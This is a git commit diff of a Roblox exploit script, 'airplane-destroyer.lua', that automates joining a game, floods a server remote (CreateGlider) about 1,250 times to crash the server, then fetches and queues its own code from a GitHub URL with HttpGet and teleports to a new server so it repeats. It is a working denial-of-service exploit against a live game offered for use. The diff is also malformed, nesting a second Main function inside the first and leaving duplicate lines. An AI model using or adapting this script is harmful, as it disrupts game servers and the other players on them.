398b46e4717a6127e083c80c2b6b371c92719953
sonomukashi <93349985+sonomukashi@users.noreply.github.com>
2024-03-08 14:09:42 -0600

    Update airplane-destroyer.lua

--- airplane-destroyer.lua
+++ airplane-destroyer.lua
@@ -48,7 +48,87 @@ end
  
 local function Main()
 	print("AirplaneDestroyer loading...")
-	game.Loaded:Wait()
+	local sTeleportService = game:GetService("TeleportService")
+local sPlayers = game:GetService("Players")
+local sWorkspace = game:GetService("Workspace")
+local sReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local function Chat(message)
+	sReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+end
+
+local function BuildPower()
+	local first = "Building power... starting"
+	Chat(first)
+    local gliderRemote = sPlayers.LocalPlayer.Backpack.Parachute.CreateGlider
+    for i = 1,1250 do
+		if i == 500 then
+			Chat("Building power... halfway done")
+		end
+		if i == 1000 then
+			Chat("Building power... almost done")
+		end
+        gliderRemote:FireServer()
+        wait()
+    end
+	Chat("Building power... Done!")
+	wait(5)
+end
+
+local function Crash()
+	Chat("Crashing server in 30 seconds...")
+	wait(15)
+	Chat("Crashing server in 15 seconds...")
+	wait(15)
+	Chat("Crashing server!")
+	sPlayers.LocalPlayer.Character.Humanoid.Health = 0
+end
+
+local function Lag()
+	
+end
+
+local function SetupTeleport()
+	for _,child in pairs(sWorkspace.OilRigChunk:GetChildren()) do
+		if child.Name == "Building" then
+			child:Destroy()
+		end
+	end
+end
+ 
+local function Main()
+	print("AirplaneDestroyer loading...")
+	wait(30)
+	Chat("AirplaneDestroyer by ID17 loaded.")
+	wait(0.1)
+	Chat("The process is automatic.")
+	wait(0.1)
+	Chat("Please redirect any concerns or comments to ID17.")
+	wait(0.1)
+	Chat("Setting up...")
+	firesignal(game:GetService("Players").LocalPlayer.PlayerGui.GraphicsLevelGUI.ImageLabel.Normal.MouseButton1Click)
+	firesignal(game:GetService("Players").LocalPlayer.PlayerGui.MainMenu.Menu.Left.Buttons.APlay.MouseButton1Click)
+	firesignal(game:GetService("Players").LocalPlayer.PlayerGui.MainMenu.APlay.IslandSelection.IslandButtons["KOil Rig"].MouseButton1Click)
+	repeat
+		wait()
+		mousemoveabs(150, 35) 
+		mouse1click()
+		mousemoveabs(200, 50) 
+		mouse1click()
+		mousemoveabs(50, 50) 
+		mouse1click()
+	until(sWorkspace:FindFirstChild("OilRigChunk"))
+	SetupTeleport()
+	sPlayers.LocalPlayer.Character:PivotTo(CFrame.new(-40072, 61, 14906))
+	BuildPower()
+	Crash()
+	wait(210)
+	queue_on_teleport(game:HttpGet("https://raw.githubusercontent.com/sonomukashi/airplane-destroyer/main/airplane-destroyer.lua"))
+	sTeleportService:Teleport(20321167)
+end
+ 
+Main()
+
 	Chat("AirplaneDestroyer by ID17 loaded.")
 	wait(0.1)
 	Chat("The process is automatic.")
